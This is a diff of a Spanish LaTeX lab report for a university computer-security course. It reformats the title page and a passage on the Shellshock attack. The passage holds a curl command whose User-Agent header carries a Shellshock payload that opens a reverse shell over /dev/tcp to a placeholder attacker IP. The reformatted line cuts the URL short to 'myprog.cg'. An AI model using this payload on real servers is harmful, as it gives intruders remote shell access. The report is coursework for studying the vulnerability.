@@ -12,12 +12,13 @@
 \begin{document}
 
 \begin{titlepage}
-\title{{\Huge Práctica 1 - Seguridad Informática}}
-\author{Pedro Tamargo \and Juan José Tambo}
+\title{{\Huge \textbf{Práctica 1 - Seguridad Informática}}}
+\author{Pedro Tamargo Allué (758267) \and Juan José Tambo Tambo (755742)}
 \date{\today}
 \clearpage\maketitle
 \thispagestyle{empty}
 \tableofcontents
+\listoffigures
 \end{titlepage}
 
 \section{Tarea 1: Experimentar con las funciones en Bash}
@@ -172,7 +173,13 @@ Al ejecutar el comando en la máquina deseada, este se conecta con el proceso \e
 
 El problema de este ataque recae en conseguir ejecutar el comando en la máquina remota cuando no se tiene acceso físico a la misma. Para ello se utiliza el ataque \emph{Shellshock}, mediante el cual se pueden ejecutar comandos de forma remota.
 Para poder realizar el ataque, se utilizará el siguiente comando desde la máquina atacante, mediante el cual se conseguirá establecer un \emph{reverse shell} en la máquina indicada.\\
-\texttt{curl -v -A "() { echo "HOLA"; }; echo Content-type: text/plain; echo; /bin/bash -i > /dev/tcp/\_{}IP\_{}MAQUINA\_{}ATACANTE/9090 0<\&1 2>\&1;" http://\_{}IP\_{}MAQUINA\_{}VICTIMA/cgi-bin/myprog.cgi}
+
+\begin{lstlisting}
+curl -v \ 
+-A "() { echo "HOLA"; }; echo Content-type: text/plain; echo; \ 
+/bin/bash -i > /dev/tcp/_IP_MAQUINA_ATACANTE/9090 0<&1 2>&1;" \
+http://_IP_MAQUINA_VICTIMA/cgi-bin/myprog.cg
+\end{lstlisting}
 
 
 
